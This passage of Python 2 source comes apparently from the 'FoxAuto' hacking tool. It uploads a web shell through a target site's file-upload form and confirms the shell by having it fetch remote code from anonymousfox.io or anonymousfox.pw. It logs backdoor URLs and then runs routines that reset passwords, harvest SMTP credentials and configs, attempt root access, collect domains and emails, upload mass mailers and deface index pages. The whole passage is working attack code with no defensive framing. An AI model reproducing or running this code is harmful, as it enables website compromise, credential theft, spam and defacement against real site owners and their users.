					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="files"' in src or "name='files'" in src or 'name= "files"' in src or 'name= \'files\'' in src or 'name = "files"' in src or 'name = \'files\'' in src or 'name ="files"' in src or 'name =\'files\'' in src or 'name=files' in src or 'name =files' in src or 'name= files' in src or 'name = files' in src:
					fileup = {'files': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="file"' in src or "name='file'" in src or 'name= "file"' in src or 'name= \'file\'' in src or 'name = "file"' in src or 'name = \'file\'' in src or 'name ="file"' in src or 'name =\'file\'' in src or 'name=file' in src or 'name =file' in src or 'name= file' in src or 'name = file' in src:
					fileup = {'file': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="image"' in src or "name='image'" in src or 'name= "image"' in src or 'name= \'image\'' in src or 'name = "image"' in src or 'name = \'image\'' in src or 'name ="image"' in src or 'name =\'image\'' in src or 'name=image' in src or 'name =image' in src or 'name= image' in src or 'name = image' in src:
					fileup = {'image': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="f"' in src or "name='f'" in src or 'name= "f"' in src or 'name= \'f\'' in src or 'name = "f"' in src or 'name = \'f\'' in src or 'name ="f"' in src or 'name =\'f\'' in src or 'name=f' in src or 'name =f' in src or 'name= f' in src or 'name = f' in src:
					fileup = {'f': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="uploads"' in src or "name='uploads'" in src or 'name= "uploads"' in src or 'name= \'uploads\'' in src or 'name = "uploads"' in src or 'name = \'uploads\'' in src or 'name ="uploads"' in src or 'name =\'uploads\'' in src or 'name=uploads' in src or 'name =uploads' in src or 'name= uploads' in src or 'name = uploads' in src:
					fileup = {'uploads': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="upload"' in src or "name='upload'" in src or 'name= "upload"' in src or 'name= \'upload\'' in src or 'name = "upload"' in src or 'name = \'upload\'' in src or 'name ="upload"' in src or 'name =\'upload\'' in src or 'name=upload' in src or 'name =upload' in src or 'name= upload' in src or 'name = upload' in src:
					fileup = {'upload': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				else :
					fileup = {'up': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				try :
					up = requp.post(url, data=filedata, files=fileup,headers=headers,timeout=30)
				except:
					up = requp.post(url, data=filedata, files=fileup,headers=headers,timeout=30)
				try :
					check = requests.get(shell_path+'?php=http://anonymousfox.io/v4/v4.txt',headers=headers,timeout=15).content
				except :
					check = requests.get(shell_path + '?php=http://anonymousfox.pw/v4/v4.txt',headers=headers,timeout=15).content
				if 'FoxAutoV4' not in check and 'Windows' in src and 'Upload file:' in src :
					filedata2 = {'a': 'FilesTools', 'p1': filename, 'p2' : 'mkfile' , 'p3' :'1{}'.format(shell), 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					try :
						up = requp.post(url, data=filedata2, headers=headers,timeout=30)
					except:
						up = requp.post(url, data=filedata2, headers=headers,timeout=30)
					try :
						check = requests.get(shell_path+'?php=http://anonymousfox.io/v4/v4.txt',headers=headers,timeout=15).content
					except :
						check = requests.get(shell_path + '?php=http://anonymousfox.pw/v4/v4.txt',headers=headers,timeout=15).content
				if 'FoxAutoV4' not in check and 'http://' in url:
					url = url.replace('http://', 'https://')
					try:
						up = requp.post(url, data=filedata, files=fileup, headers=headers,timeout=30)
					except:
						up = requp.post(url, data=filedata, files=fileup,headers=headers,timeout=30)
					if 'http://' in shell_path:
						shell_path = shell_path.replace('http://', 'https://')
					try :
						check = requests.get(shell_path+'?php=http://anonymousfox.io/v4/v4.txt',headers=headers,timeout=15).content
					except :
						check = requests.get(shell_path + '?php=http://anonymousfox.pw/v4/v4.txt',headers=headers,timeout=15).content
				if 'FoxAutoV4' in check:
					print ' {}[+] Shell Working => {}{}'.format(fg,fr,shell_path)
					open('Results/backdor.txt', 'a').write(shell_path+'?php=http://anonymousfox.io/v4/up.txt\n')
					if w == 1 :
						resetPassword(shell_path,url,t)
						print ''
					elif w == 2 :
						resetPassword2(shell_path,email)
						print ''
					elif w == 3 :
						finderSMTP(shell_path)
						getSMTP(shell_path)
						print ''
					elif w == 4 :
						finderScript(shell_path,url)
						print ''
					elif w == 5 :
						accesshash(shell_path,url)
						print ''
					elif w == 6 :
						getConfig(shell_path,url,0)
						print ''
					elif w == 7 :
						getConfig(shell_path,url,1)
						print ''
					elif  w == 8 :
						getRoot(shell_path)
						print ''
					elif w == 9 :
						getDomains(shell_path)
						print ''
					elif w == 10  :
						getMails(shell_path)
						print ''
					elif w == 11 :
						getConfig(shell_path, url, 2)
						print ''
					elif w == 12 and tyMailer == 1 :
						uploadMailerOlux(shell_path, mailerOlux)
						print ''
					elif w == 12 and tyMailer == 2 :
						uploadMailerXleet(shell_path, mailerXleet)
						print ''
					elif w == 13 and tyUP == 1 :
						massUploadFile1(shell_path, fileSrc)
						print ''
					elif w == 13 and tyUP == 2:
						massUploadFile2(shell_path, fileSrc)
						print ''
					elif w == 14 and tyUP == 1:
						massUploadIndex1(shell_path, fileSrc, nameF)
						print ''
					elif w == 14 and tyUP == 2:
						massUploadIndex2(shell_path, fileSrc)
						print ''
					elif w == 17 :
						checkSend(shell_path, url)
						print ''
					elif w == 18 :
						resetPassword(shell_path, url, t)
						finderSMTP(shell_path)
						getSMTP(shell_path)
						print ''
					elif w == 19 :
						resetPassword(shell_path, url, t)
						finderSMTP(shell_path)
						getSMTP(shell_path)
						accesshash(shell_path, url)
						getConfig(shell_path, url, 1)
						getRoot(shell_path)
						print ''
				else :
					print ' {}[-] Shell NOT Working OR Upload failed\n'.format(fr)
			except :
				print ' {}[-] Shell NOT Working OR Upload failed\n'.format(fr)
	except :
		pass

main()
ShellAuto()